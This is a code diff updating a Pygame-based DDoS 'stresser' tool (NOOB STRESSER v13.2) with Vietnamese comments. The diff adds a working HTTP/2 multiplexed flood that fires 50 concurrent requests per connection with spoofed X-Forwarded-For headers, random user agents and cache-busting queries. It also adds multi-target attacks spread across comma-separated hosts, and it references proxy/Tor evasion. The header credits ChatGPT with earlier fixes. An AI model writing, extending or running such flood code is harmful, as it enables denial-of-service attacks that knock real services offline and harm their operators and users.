@@ -1,7 +1,7 @@
 """
-NOOB STRESSER v13.1 — WRAITHSTRIKE
+NOOB STRESSER v13.2 — WRAITHSTRIKE
 Pygame GUI pseudo-3D red hacker + v11.2 engine + 12 ChatGPT fixes
-+ HTTP+HTTPS mixed mode + proxy toggle button + live proxy status
++ HTTP+HTTPS mixed mode + proxy toggle + HTTP/2 flood + multi-target
 """
 
 import pygame
@@ -18,6 +18,13 @@ import sys
 import math
 import os
 import colorsys
+import asyncio
+
+try:
+    import httpx
+    HTTPX_OK = True
+except ImportError:
+    HTTPX_OK = False
 
 # ── Fix #11: lưu GC threshold gốc trước khi tune ────────────────────────────
 _GC_DEFAULT = gc.get_threshold()   # (700, 10, 10) mặc định CPython
@@ -422,6 +429,49 @@ def _http_https_combined(host, port, stats, stop_ev):
     t1.start(); t2.start()
     t1.join();  t2.join()
 
+def _http2_flood(host, port, stats, stop_ev):
+    """
+    HTTP/2 multiplexing flood — 50 concurrent streams trên 1 TCP connection.
+    Cần: pip install httpx[h2]
+    Mỗi main thread giữ 1 HTTP/2 connection, pump 50 streams cùng lúc.
+    """
+    if not HTTPX_OK:
+        _http_https_combined(host, port, stats, stop_ev)
+        return
+
+    async def _h2_loop():
+        limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
+        async with httpx.AsyncClient(
+            http2=True, verify=False, timeout=3.0, limits=limits
+        ) as client:
+            base = f"https://{host}:{port}"
+            while not stop_ev.is_set():
+                tasks = [
+                    client.get(
+                        f"{base}{random.choice(PATHS)}?r={random.randint(0,999999)}",
+                        headers={
+                            "User-Agent":      random.choice(AGENTS),
+                            "X-Forwarded-For": _rip(),
+                            "Cache-Control":   "no-cache",
+                        }
+                    )
+                    for _ in range(50)
+                ]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                for r in results:
+                    if isinstance(r, Exception):
+                        _inc(stats, "errors")
+                    else:
+                        _inc(stats, "sent")
+
+    loop = asyncio.new_event_loop()
+    try:
+        loop.run_until_complete(_h2_loop())
+    except Exception:
+        _inc(stats, "errors")
+    finally:
+        loop.close()
+
 def _check_proxy(host, port, timeout=3):
     """Test kết nối TCP tới proxy — trả về True/False."""
     try:
@@ -432,6 +482,7 @@ def _check_proxy(host, port, timeout=3):
         return False
 
 ATTACK_MAP = {
+    "HTTP/2 Flood": _http2_flood,
     "HTTP+HTTPS":   _http_https_combined,
     "HTTP Flood":   _http_flood,
     "HTTPS Flood":  _https_flood,
@@ -700,6 +751,7 @@ class LogPanel:
 # ── main app ──────────────────────────────────────────────────────────────────
 class NoobApp:
     MODES = [
+        ("HTTP/2 Flood", "L7", "★★★★★"),
         ("HTTP+HTTPS",   "L7", "★★★★★"),
         ("HTTP Flood",   "L7", "★★★★☆"),
         ("HTTPS Flood",  "L7", "★★★★★"),
@@ -752,7 +804,7 @@ class NoobApp:
                 cx0 + c*(cw+3), cy0 + r*(ch+4), cw, ch, name, layer, stars))
         self._cards[0].selected = True
 
-        self.inp_target   = InputBox(14,  396, 300, 30, "your-server.com", "TARGET")
+        self.inp_target   = InputBox(14,  396, 300, 30, "host1.com,host2.com", "TARGET(S) — dấu phẩy để multi")
         self.inp_port     = InputBox(324, 396, 80,  30, "443",             "PORT (1-65535)")
         self.inp_threads  = InputBox(414, 396, 90,  30, "500",             "THREADS")
         self.inp_duration = InputBox(514, 396, 90,  30, "60",              "DURATION (s)")
@@ -778,8 +830,12 @@ class NoobApp:
         self._pb_rect = (14, 598, 972, 12)
         self._log = LogPanel(14, 622, 972, 112)
 
-        self._log.add("[NOOB STRESSER v13.1 · WRAITHSTRIKE] ready", "ok")
-        self._log.add("[SYS] 12 ChatGPT fixes + HTTP+HTTPS mixed mode + proxy button", "info")
+        self._log.add("[NOOB STRESSER v13.2 · WRAITHSTRIKE] ready", "ok")
+        self._log.add("[SYS] HTTP/2 flood + multi-target + proxy button", "info")
+        if HTTPX_OK:
+            self._log.add("[SYS] httpx[h2] OK — HTTP/2 sẵn sàng (50 streams/conn)", "ok")
+        else:
+            self._log.add("[!] HTTP/2 cần: pip install httpx[h2]", "warn")
         if SOCKS_OK:
             self._log.add("[SYS] PySocks OK — TCP proxy/Tor sẵn sàng (UDP bypass proxy)", "ok")
         else:
@@ -818,13 +874,18 @@ class NoobApp:
 
     def _start(self):
         global _PROXY_ENABLED, _PROXY_HOST, _PROXY_PORT, _PROXY_TYPE
-        host = self.inp_target.text.strip()
-        if not host:
+
+        # multi-target parse
+        raw_targets = self.inp_target.text.strip()
+        if not raw_targets:
             self._log.add("[!] Nhập target trước", "error"); return
+        targets = [t.strip() for t in raw_targets.split(",") if t.strip()]
+        if not targets:
+            self._log.add("[!] Target không hợp lệ", "error"); return
 
         port     = self._parse_port(self.inp_port.text, 80)
-        try: threads = max(1, min(int(self.inp_threads.text), 2000))
-        except: threads = 100
+        try: total_threads = max(1, min(int(self.inp_threads.text), 2000))
+        except: total_threads = 100
         try: duration = max(1, int(self.inp_duration.text))
         except: duration = 60
 
@@ -836,6 +897,10 @@ class NoobApp:
         fn   = ATTACK_MAP.get(mode)
         if not fn: return
 
+        # HTTP/2 check
+        if mode == "HTTP/2 Flood" and not HTTPX_OK:
+            self._log.add("[!] HTTP/2 cần: pip install httpx[h2] — fallback HTTP+HTTPS", "warn")
+
         self._running      = True
         self._stop_ev      = threading.Event()
         self._stats        = {"sent": 0, "errors": 0}
@@ -843,19 +908,20 @@ class NoobApp:
         self._duration     = duration
         self._last_log_sec = -1
 
-        proxy_info = f" | proxy={_PROXY_HOST}:{_PROXY_PORT} (TCP)" if _PROXY_ENABLED else ""
-        udp_warn   = " ⚠ UDP ignores proxy" if _PROXY_ENABLED and "UDP" in mode else ""
-        self._log.add(f"[▶] {threads}t → {host}:{port} | {duration}s | {mode}{proxy_info}{udp_warn}", "ok")
+        # chia threads đều cho các targets
+        per_target = max(1, total_threads // len(targets))
+        proxy_info = f" | proxy={_PROXY_HOST}:{_PROXY_PORT}" if _PROXY_ENABLED else ""
+        self._log.add(
+            f"[▶] {len(targets)} target(s) × {per_target}t = {per_target*len(targets)}t | "
+            f"{duration}s | {mode}{proxy_info}", "ok")
 
-        # Fix #10: label rõ SENT = bytes gửi thành công, không phải server processed
-        self._log.add("[INFO] SENT/s = sendall() success, không guarantee server processed", "info")
-
-        threading.Thread(
-            target=lambda: setattr(self, '_live_threads',
-                _spawn_threads(fn, host, port, threads,
-                               self._stop_ev, self._stats, duration)),
-            daemon=True
-        ).start()
+        for host in targets:
+            self._log.add(f"    → {host}:{port}", "info")
+            threading.Thread(
+                target=_spawn_threads,
+                args=(fn, host, port, per_target, self._stop_ev, self._stats, duration),
+                daemon=True
+            ).start()
 
     def _stop(self, auto=False):
         self._stop_ev.set()
@@ -890,7 +956,7 @@ class NoobApp:
         pcol = tuple(int(C_RED_DIM[i]+(C_RED_GLOW[i]-C_RED_DIM[i])*pulse) for i in range(3))
         pygame.draw.circle(self.surf, pcol, (W-20, 20), 6)
         draw_glow_rect(self.surf, (W-26,14,12,12), pcol, radius=6, alpha=60)
-        sub = self.f_sub.render("v13.1  ·  WRAITHSTRIKE  ·  12 MODES  ·  PROXY BUTTON  ·  HTTP+HTTPS MIXED", True, C_DIM)
+        sub = self.f_sub.render("v13.2  ·  WRAITHSTRIKE  ·  13 MODES  ·  HTTP/2 MUX  ·  MULTI-TARGET", True, C_DIM)
         self.surf.blit(sub, (W//2-sub.get_width()//2, 44))
 
         # modes
